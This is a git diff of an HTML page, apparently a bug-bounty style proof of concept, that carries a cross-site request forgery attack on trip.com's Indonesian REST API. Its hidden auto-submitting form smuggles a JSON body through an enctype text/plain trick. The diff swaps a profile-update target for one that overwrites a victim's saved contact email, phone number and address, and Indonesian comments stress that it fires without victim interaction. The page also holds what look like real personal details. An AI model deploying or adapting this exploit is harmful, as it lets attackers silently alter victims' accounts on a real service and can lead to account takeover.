@@ -1,15 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Faiz gitpage</title>
+    <title>Mencoba Memproses...</title>
 </head>
-<body onload="document.forms[0].submit()">
-  <form action="https://id.trip.com/restapi/soa2/27024/saveUserInfo" method="POST" enctype="text/plain">
-    <input type="hidden" 
-      name='{"locale":"id-ID","ThisUserInfo":{"cityNameResident":"Kebumen","cityNameInterest":"Bandung","gender":"M","countryOrRegion":"ID","foreignNickName":"wong pinteralinda","cityIdResident":"88332","cityIdInterest":"532494"},"ignore":"'
-      value='"}'>
-  </form>
+<body>
+    <p>Sedang mengalihkan halaman, mohon tunggu...</p>
+
+    <!-- Enctype text/plain digunakan agar data dikirim sebagai teks mentah -->
+    <form id="csrfForm" action="https://id.trip.com/restapi/soa2/27024/saveCommonContact" method="POST" enctype="text/plain">
+        
+        <!-- Nama atribut input berisi bagian awal JSON hingga tanda titik dua pertama -->
+        <input type="hidden" 
+               name='{"accessCode":"IBUPCAUTEHNTICATE","clientInfo":{"locale":"id-ID"},"commonContact":{"iD":250215114,"contactEmail":"alhamdulillah@gmail.com","isDefault":"1","countryCode":"62","mobilePhone":"81910288144","cNName":"wongkebumen","address":{"countryRegionName":"Indonesia","countryRegionCode":"ID","detailAddress":"jalan candiwulan gandusari","city":"kebumen","postCode":"54366"}},"head":{"cid":"09034033315449719640","ctok":"","cver":"1.0","lang":"01","sid":"8888","syscode":"09","auth":"","xsid":"","extension":[],"Locale":"id-ID","Language":"id","Currency":"IDR","ClientID":"09034033315449719640"},"padding"' 
+               value=':"true"}'>
+               
+    </form>
+
+    <script>
+        // Mengirimkan form secara otomatis tanpa interaksi korban
+        document.getElementById('csrfForm').submit();
+    </script>
 </body>
 </html>
